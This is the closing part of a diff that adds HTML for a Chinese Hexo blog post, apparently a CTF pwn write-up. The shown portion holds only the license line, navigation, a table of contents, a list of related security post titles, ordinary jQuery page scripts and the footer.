+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/2020/03/12/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%20writeup%E3%80%90%E9%83%A8%E5%88%86%E3%80%91/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          第二届强网杯pwn writeup【部分】
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/2020/03/12/%E7%94%B1%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84DNS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">由一道题目引发的DNS学习笔记</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-200pt-Smashes"><span class="toc-number">2.</span> <span class="toc-text">0x01 200pt Smashes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-250pt-level4"><span class="toc-number">3.</span> <span class="toc-text">0x02 250pt level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-300pt-level5"><span class="toc-number">4.</span> <span class="toc-text">0x03 300pt level5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-400pt-Guestbook2"><span class="toc-number">5.</span> <span class="toc-text">0x04 400pt Guestbook2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-450pt-ItemBoard"><span class="toc-number">6.</span> <span class="toc-text">0x05 450pt ItemBoard</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/2020/03/12/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%20writeup%E3%80%90%E9%83%A8%E5%88%86%E3%80%91/" title="上一篇: 第二届强网杯pwn writeup【部分】">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2020/03/12/%E7%94%B1%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84DNS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="下一篇: 由一道题目引发的DNS学习笔记">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/0CTF2018%20babyheap/">0CTF2018 babyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/CVE-2017-0199%20Microsoft%20Office%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/">CVE-2017-0199 Microsoft Office 逻辑漏洞复现和利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/HCTF2017%20Level2%E7%9A%84%E4%B8%A4%E9%81%93pwn%E9%A2%98/">HCTF2017 level2的两道pwn题</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/CVE-2017-8570%20Microsoft%20Office%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/">CVE-2017-8570 Microsoft Office 逻辑漏洞复现和利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%20writeup%E3%80%90%E9%83%A8%E5%88%86%E3%80%91/">第二届强网杯pwn writeup【部分】</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/%E5%88%B7Jarvis%20OJ%E6%97%B6%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF%5B%E4%B8%8D%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0%5D/">刷Jarvis OJ时学到的新姿势【不定时更新】</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/%E7%94%B1%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84DNS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">由一道题目引发的DNS学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/CVE-2012-0158%20Microsoft%20Office%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2012-0158 Microsoft Office 栈溢出漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/BCTF2018%20baby_arena/">BCTF2018 baby_arena</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/%E5%B0%81%E4%BA%86%E4%B8%AA%E5%BA%93/">封了个库</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BAWriteup/">网鼎杯第一场Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/XNUCA2018%E5%88%9D%E8%B5%9Bpwn%20writeup/">XNUCA2018初赛pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/CISCN2019%20%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9Bpwn/">CISCN2019 国赛线上初赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/Tcache%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">Tcache机制及漏洞利用方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9%20Step%20by%20Step/">Ubuntu虚拟机扩容 Step by Step</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">FILE结构体及漏洞利用方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/Windows%E7%B3%BB%E7%BB%9F%E4%B8%8B%E5%85%B8%E5%9E%8B%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6/">Windows系统下典型堆漏洞产生原理及利用方法研究</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 Fish_o0O
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 3;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
